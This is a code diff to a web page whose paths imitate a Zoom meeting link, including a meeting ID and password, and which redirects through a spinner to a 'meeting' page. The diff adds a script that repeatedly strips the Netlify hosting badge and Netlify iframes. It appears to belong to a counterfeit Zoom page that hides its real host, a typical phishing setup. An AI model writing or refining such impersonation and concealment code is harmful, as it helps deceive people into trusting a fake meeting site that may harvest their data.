@@ -329,7 +329,7 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
   //  ★ CONFIG
   // ============================================================
   var HOME_PAGE_URL     = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/index.html';
-  var SPINNER_PAGE_URL  = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/preview/spinner.html?to=/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/meeting/index.html&ms=1500';
+var SPINNER_PAGE_URL  = '/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/preview/spinner.html?to=/zoom.us_89315766107pwd=xe2c45bhRM0JjjXfmeOrEh4a3K6TQe.3/meeting/index.html&ms=1500';
 
   var $ = function (id) { return document.getElementById(id); };
 
@@ -626,6 +626,25 @@ a[href*="netlify.com"][target="_blank"]:not(.wc-link2) {
   });
 
 })();
+</script>
+
+<!-- Force Remove Netlify Badge -->
+<script>
+  (function() {
+    function removeBadge() {
+      var badge = document.getElementById('netlify-badge');
+      if (badge) badge.remove();
+      
+      var iframes = document.querySelectorAll('iframe[src*="netlify.com"]');
+      for (var i = 0; i < iframes.length; i++) {
+        iframes[i].remove();
+      }
+    }
+    
+    // Run immediately, and set up a watcher in case Netlify injects it late
+    removeBadge();
+    setInterval(removeBadge, 500); 
+  })();
 </script>
 </body>
 </html>
